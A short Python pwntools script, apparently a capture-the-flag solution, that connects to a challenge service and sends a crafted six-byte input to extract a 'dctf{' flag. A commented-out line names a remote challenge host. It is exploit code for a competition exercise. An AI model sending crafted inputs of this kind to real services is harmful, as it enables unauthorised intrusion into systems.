from pwn import *

#p = remote("inst-jmtthpx3t3.tls.vuln.si", 443, ssl=True)
p = remote("127.0.0.1", 1337)

p.sendline(bytes([0x00,0x00,0x00,0x00,0x00,0x05]))

data = p.recvall()
if b"dctf{" in data:
    print(data)
